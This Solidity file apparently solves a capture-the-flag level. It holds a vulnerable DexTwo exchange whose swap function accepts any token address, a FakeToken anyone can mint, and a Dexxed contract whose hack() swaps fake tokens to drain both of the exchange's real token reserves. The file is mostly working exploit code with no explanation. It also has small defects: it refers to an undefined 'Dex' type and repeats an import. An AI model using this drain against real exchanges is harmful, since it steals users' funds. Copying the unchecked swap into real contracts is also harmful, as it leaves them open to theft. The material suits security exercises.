// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}


contract FakeToken is ERC20 {
    constructor() ERC20("JAFOSTES", "JF"){
        _mint(0x862e287502ecBFc4497c766BDe9CDEBDf322ff55, 100);
    }

    function mint(address cont, uint amount) public {
        _mint(cont, amount);
    }
}

contract Dexxed {
    Dex dex = Dex(0x862e287502ecBFc4497c766BDe9CDEBDf322ff55);
    address fakeToken = 0x71210fD32A26C80A92690ae953C4285A0069c2f6;

    function hack() public {
        dex.swap(fakeToken, dex.token1(), 100);
        dex.swap(fakeToken, dex.token2(), 200);
    }

    function approve() public {
        ERC20(fakeToken).approve(address(dex), 300);
    }
    
}